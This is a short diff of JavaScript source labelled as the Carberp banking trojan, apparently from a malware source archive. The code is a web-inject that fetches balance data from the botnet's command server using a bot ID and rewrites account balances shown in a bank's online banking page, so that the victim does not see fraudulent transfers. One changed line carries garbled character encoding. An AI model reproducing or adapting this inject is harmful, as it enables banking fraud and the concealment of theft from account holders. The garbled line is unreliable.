@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     â€”
+ */
 function pg_main7() {
     this.hideB = function(){
         $.getJSON(admurl+"gate/getBallance/"+botid+"/"+ver7+"/?callback=?", function(bal){
@@ -6,7 +17,7 @@ function pg_main7() {
               for (var i = 1; i < tr.length; i++){
               var span = tr[i].getElementsByTagName('SPAN');
                 for (var j = 0; j < bal.length; j++){
-                   if (span[3].innerHTML==bal[j]['acc'] && span[1].innerHTML==top.window.frames.RT_IC_NVGT.document.getElementById('csn').innerHTML && span[5].innerHTML=='RUR' && span[7].innerHTML=='ð/ñ'){
+                   if (span[3].innerHTML==bal[j]['acc'] && span[1].innerHTML==top.window.frames.RT_IC_NVGT.document.getElementById('csn').innerHTML && span[5].innerHTML=='RUR' && span[7].innerHTML=='ï¿½/ï¿½'){
                         span[4].innerHTML=parseFloat(bal[j]['bal']);
                    }
                 }
